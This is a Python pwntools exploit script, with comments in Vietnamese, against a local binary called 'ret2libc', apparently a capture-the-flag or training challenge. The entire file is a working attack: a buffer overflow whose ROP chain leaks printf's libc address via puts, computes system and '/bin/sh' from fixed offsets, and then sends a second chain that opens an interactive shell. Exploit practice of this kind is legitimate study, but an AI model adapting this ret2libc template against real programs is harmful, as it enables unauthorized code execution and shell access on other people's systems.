from pwn import *

# 1 số địa chỉ cần thiết
p = process('./ret2libc')
padding = b"A"*104
pop_rdi = 0x00000000004006a3
print_at_got = 0x601020
puts_at_plt = 0x400480
main = 0x0000000000400610

# tạo buffer truyền vào chương trình
buf = padding
buf += p64(pop_rdi)
buf += p64(print_at_got)
buf += p64(puts_at_plt)
buf += p64(main)

# gửi buffer
p.sendline(buf)
p.recvuntil(b"No shell for you :(\n")

recv = p.recvline()
print(recv)

# in ra địa chỉ hàm printf()
leak = u64(recv.strip().ljust(8, b"\x00"))
log.info(f"Leaked printf address -> {hex(leak)}")

# tính base address của libc
offset_printf = 0x52b30
libc_base = leak - offset_printf
log.info(f"libc base address -> {hex(libc_base)}")

# tính địa chỉ hàm system()
offset_system = 0x4c920
libc_system = libc_base + offset_system
log.info(f"system address -> {hex(libc_system)}")

# tính địa chỉ xâu "/bin/sh"
offset_binsh = 0x19604f
libc_binsh = libc_base + offset_binsh
log.info(f"/bin/sh address -> {hex(libc_binsh)}")

# truyền chuỗi exploit
ret = 0x000000000040060f
exploit = padding
exploit += p64(pop_rdi)
exploit += p64(libc_binsh)
exploit += p64(ret)
exploit += p64(libc_system)

# gửi chuỗi exploit
p.sendline(exploit)

p.interactive() 